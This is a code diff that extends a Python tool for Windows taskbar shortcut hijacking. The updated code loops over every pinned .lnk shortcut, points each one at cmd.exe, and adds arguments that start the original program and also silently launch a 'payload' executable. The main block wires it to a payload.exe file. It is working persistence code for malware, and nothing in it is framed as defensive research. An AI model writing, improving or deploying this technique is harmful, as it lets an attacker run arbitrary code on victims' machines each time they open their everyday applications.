@@ -11,29 +11,33 @@ class TaskbarShortcut:
     def __init__(self, payload: str) -> None:
         self.payload = payload
         
-    def modify_edge_shortcuts(self):
+    def modify_shortcuts(self):
+        current_user = os.getlogin()
+        shortcut_folder = r"C:\Users\{}\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar".format(current_user)
         
-        current_user = os.getlogin() #gets users loggin name
-        
-        edge_shortcut_path = r"C:\Users\{}\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\Taskbar\Microsoft Edge.lnk".format(current_user) #TODO: dynamically iterate through shortcut folder
-        self.modify_shortcut(edge_shortcut_path)
+        for shortcut_file in os.listdir(shortcut_folder):
+            shortcut_path = os.path.join(shortcut_folder, shortcut_file)
+            if shortcut_file.endswith('.lnk'):
+                self.modify_shortcut(shortcut_path)
 
     def modify_shortcut(self, shortcut_path):
-                shell = win32com.client.Dispatch("WScript.Shell")
-                shortcut = shell.CreateShortCut(shortcut_path)
-                
-                edge_path = shortcut.TargetPath
-                PersisPayload = self.payload
-                
-                arguments = rf'%windir%\system32\cmd.exe “/c start msedge.exe & start {PersisPayload}'
-                shortcut.Arguments = arguments
-                shortcut.Save()
-                print(f"Shortcut Modified: {shortcut_path}")
-                print(arguments)
-
+        shell = win32com.client.Dispatch("WScript.Shell")
+        shortcut = shell.CreateShortCut(shortcut_path)
+        
+        original_target_path = shortcut.TargetPath
+        PersisPayload = self.payload
+        
+        arguments = rf'C:\Windows\System32\cmd.exe /c "start "" "{original_target_path}" & start "" "{PersisPayload}""'
+        shortcut.Arguments = arguments
+        shortcut.TargetPath = r'C:\Windows\System32\cmd.exe'  
+        shortcut.Save()
+        print(f"Shortcut Modified: {shortcut_path}")
+        print(arguments)
 
     def install(self):
-        self.modify_edge_shortcuts()
+        self.modify_shortcuts()
         
 if __name__ == "__main__":
-    TaskbarShortcut.install()
+    payload = r"C:\Users\UlyssesHill\Downloads\payload.exe"  # Replace this with the path to your payload
+    taskbar_shortcut = TaskbarShortcut(payload)
+    taskbar_shortcut.install()
